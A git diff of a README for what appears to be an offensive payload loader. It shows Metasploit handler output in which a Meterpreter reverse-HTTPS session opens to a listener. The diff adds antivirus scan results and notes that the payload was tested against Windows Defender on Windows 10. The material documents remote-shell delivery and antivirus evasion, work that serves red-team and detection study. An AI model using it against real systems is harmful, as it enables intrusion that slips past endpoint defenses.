@@ -43,3 +43,13 @@ msf6 exploit(multi/handler) >
 [*] https://192.168.1.228:443 handling request from 192.168.1.142; (UUID: lsezjczd) Staging x64 payload (201308 bytes) ...
 [*] Meterpreter session 1 opened (192.168.1.228:443 -> 192.168.1.142:60433) at 2021-10-07 08:32:00 +0100
 ```
+
+# AV Scan Results
+
+The binary was scanned using [antiscan.me](https://antiscan.me/scan/new/result?id=bpyZ4JnoDmkL) on 07/10/2021.
+
+![AV Scan](https://github.com/plackyhacker/SysCalls/blob/main/Suspended_scan.png?raw=true)
+
+# Notes
+
+Tested with windows/x64/meterpreter/reverse_https on Windows 10 Pro (build 10.0.19042) with Defender.
